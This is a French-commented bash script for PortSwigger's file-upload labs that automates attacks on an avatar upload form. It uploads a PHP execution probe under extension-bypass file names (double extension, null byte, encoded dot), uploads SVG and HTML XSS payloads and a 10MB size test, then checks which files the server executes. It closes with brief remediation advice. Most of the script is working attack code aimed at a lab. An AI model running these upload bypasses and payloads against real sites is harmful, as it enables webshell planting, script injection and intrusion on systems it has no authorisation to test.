#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
UPLOAD_PATH="/my-account/avatar"
COOKIE="session=<your-session-cookie>"
UPLOAD_FIELD="avatar"
UPLOAD_DIR="/files/avatars"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Analyse du formulaire d'upload (structure, restrictions)
analyze_upload_form() {
    print_sep
    echo "[Analyse] Extraction et analyse du formulaire d'upload"
    form=$(curl -sk -b "$COOKIE" "$TARGET_URL$UPLOAD_PATH")
    echo "- Champs de formulaire détectés :"
    echo "$form" | grep -iE 'form|input|enctype|type=' | sed 's/^/    /'
    echo "- Points à vérifier :"
    echo "    * Nom du champ d'upload (par défaut : $UPLOAD_FIELD)"
    echo "    * Méthode (POST), enctype (multipart/form-data)"
    echo "    * Restrictions côté client (accept, type MIME, extensions)"
    echo "    * Limite de taille (si visible ou message d'erreur)"
}

# 2. Attaque : upload d'un fichier image légitime (test de base)
attack_upload_image() {
    print_sep
    echo "[Attaque] Upload d'une image légitime (test de base)"
    convert -size 50x50 xc:blue test.jpg 2>/dev/null || touch test.jpg
    curl -sk -b "$COOKIE" -F "$UPLOAD_FIELD=@test.jpg;type=image/jpeg" "$TARGET_URL$UPLOAD_PATH" -o /tmp/upload_img.html
    echo "- Essayez d'accéder à $TARGET_URL$UPLOAD_DIR/test.jpg"
}

# 3. Attaque : upload de fichiers dangereux (webshell, polyglotte, SVG, HTML)
attack_upload_dangerous() {
    print_sep
    echo "[Attaque] Upload de fichiers dangereux (webshell, polyglotte, SVG, HTML)"
    echo "<?php echo 'VULNUPLOAD'; ?>" > shell.php
    echo "<svg/onload=alert('svgxss')>" > shell.svg
    echo "<html><body><script>alert('htmlxss')</script></body></html>" > shell.html
    cp shell.php shell.php.jpg
    cp shell.php shell.jpg.php
    cp shell.php "shell.php;.jpg"
    cp shell.php "shell.php%00.jpg"
    cp shell.php "shell%2Ephp"
    for fname in shell.php shell.php.jpg shell.jpg.php "shell.php;.jpg" "shell.php%00.jpg" "shell%2Ephp" shell.svg shell.html; do
        echo "    * Upload de $fname"
        curl -sk -b "$COOKIE" -F "$UPLOAD_FIELD=@$fname;type=application/octet-stream" "$TARGET_URL$UPLOAD_PATH" -o /tmp/upload_resp.html
    done
    echo "- Uploads terminés. Passez à la phase de contrôle."
}

# 4. Attaque : bypass d’extension et encodage
attack_bypass_extension() {
    print_sep
    echo "[Attaque] Bypass d'extension (double extension, null byte, encodage)"
    for fname in shell.php shell.php.jpg shell.jpg.php "shell.php;.jpg" "shell.php%00.jpg" "shell%2Ephp"; do
        echo "    * Upload de $fname"
        curl -sk -b "$COOKIE" -F "$UPLOAD_FIELD=@$fname;type=application/octet-stream" "$TARGET_URL$UPLOAD_PATH" -o /tmp/upload_resp.html
    done
    echo "- Testez l'accès à chaque nom de fichier dans $UPLOAD_DIR/"
}

# 5. Attaque : test de taille (DoS ou contournement)
attack_upload_large_file() {
    print_sep
    echo "[Attaque] Upload d'un fichier volumineux (test de limite de taille)"
    dd if=/dev/zero of=bigfile.jpg bs=1M count=10 2>/dev/null
    curl -sk -b "$COOKIE" -F "$UPLOAD_FIELD=@bigfile.jpg;type=image/jpeg" "$TARGET_URL$UPLOAD_PATH" -o /tmp/upload_big.html
    echo "- Vérifiez si l'upload est accepté ou rejeté (erreur ou ralentissement possible)."
}

# 6. Contrôle : vérification de l'accès/exécution/téléchargement
control_uploaded_files() {
    print_sep
    echo "[Contrôle] Vérification de l'accessibilité et de l'exécution des fichiers uploadés"
    FILES=("test.jpg" "shell.php" "shell.php.jpg" "shell.jpg.php" "shell.php;.jpg" "shell.php%00.jpg" "shell%2Ephp" "shell.svg" "shell.html" "bigfile.jpg")
    for fname in "${FILES[@]}"; do
        url="$TARGET_URL$UPLOAD_DIR/$fname"
        echo "    * Test d'accès à $url"
        resp=$(curl -sk "$url")
        if echo "$resp" | grep -q "VULNUPLOAD"; then
            echo "      [+] Fichier exécutable/interprété ! (exécution PHP confirmée)"
        elif echo "$resp" | grep -q "svgxss"; then
            echo "      [+] SVG accessible, testez XSS dans le navigateur."
        elif echo "$resp" | grep -q "htmlxss"; then
            echo "      [+] HTML accessible, testez XSS dans le navigateur."
        elif [[ "$resp" =~ "<?php" ]]; then
            echo "      [+] Fichier accessible mais code PHP affiché, pas exécuté."
        elif [[ "$fname" == "bigfile.jpg" && $(stat -c%s bigfile.jpg 2>/dev/null) -gt 5000000 ]]; then
            if [[ $(echo "$resp" | wc -c) -gt 1000000 ]]; then
                echo "      [+] Gros fichier uploadé et accessible (risque DoS ou absence de limite)."
            else
                echo "      [-] Gros fichier rejeté ou tronqué."
            fi
        elif [[ "$resp" =~ "JFIF" ]]; then
            echo "      [+] Image accessible."
        else
            echo "      [-] Fichier non accessible ou filtré."
        fi
    done
    echo "- Contrôle terminé. Passez à la remédiation si une faille est détectée."
}

# 7. Remédiation et conseils
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Filtrez extension et type MIME côté serveur (pas seulement côté client)."
    echo "- Vérifiez le contenu réel du fichier (magic bytes, signatures)."
    echo "- Ne stockez jamais de fichier uploadé dans un dossier web-accessible en exécution."
    echo "- Renommez le fichier côté serveur (nom aléatoire), ne conservez jamais l'extension d'origine."
    echo "- Servez les fichiers uploadés avec Content-Disposition: attachment."
    echo "- Pour les labs PortSwigger, validez l'exécution du code, l'accès au secret, ou l'exploit XSS."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/file-upload"
}

# 8. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Analyse du formulaire d'upload et des restrictions côté client."
    echo "2. Tentatives d'upload avec images, fichiers dangereux, bypass d'extension, et gros fichiers."
    echo "3. Vérification automatique de l'accès, de l'exécution et du comportement serveur."
    echo "4. Application des recommandations de sécurité si une faille est trouvée."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger File Upload (tous challenges) : analyse, attaque et contrôle ==="
analyze_upload_form
attack_upload_image
attack_upload_dangerous
attack_bypass_extension
attack_upload_large_file
control_uploaded_files
print_remediation
print_summary

# End of script
